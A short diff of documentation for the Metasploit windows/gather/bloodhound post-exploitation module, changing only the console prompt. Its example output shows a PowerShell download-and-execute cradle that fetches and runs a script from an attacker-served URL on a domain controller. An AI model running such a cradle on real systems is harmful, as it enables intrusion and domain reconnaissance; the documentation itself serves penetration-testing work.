@@ -79,7 +79,7 @@ If the cache file (.bin) should NOT be written to disk.  Default is `true`.
 ### Windows 2012 Domain Controller, Download method
 
 ```
-msf6 post(windows/gather/bloodhound) > run
+msf post(windows/gather/bloodhound) > run
 
 [*] Using URL: http://1.1.1.1:8080/127mPhBr3dZ
 [*] Loading BloodHound with: IEX (new-object net.webclient).downloadstring('http://1.1.1.1:8080/127mPhBr3dZ')
